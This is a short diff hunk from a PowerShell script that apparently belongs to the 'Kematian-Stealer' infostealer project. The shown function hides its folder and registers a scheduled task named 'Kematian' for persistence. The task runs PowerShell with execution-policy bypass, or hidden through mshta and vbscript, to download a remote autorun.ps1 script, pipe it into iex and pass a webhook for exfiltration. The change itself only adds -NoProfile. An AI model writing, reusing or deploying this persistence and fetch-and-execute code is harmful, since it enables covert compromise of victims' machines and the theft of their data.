@@ -81,7 +81,7 @@ function Invoke-TASKS {
         $KDOT_DIR.attributes = "Hidden", "System"
         $task_name = "Kematian"
         if ($debug) {
-            $task_action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+            $task_action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
         }
         else {
             $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
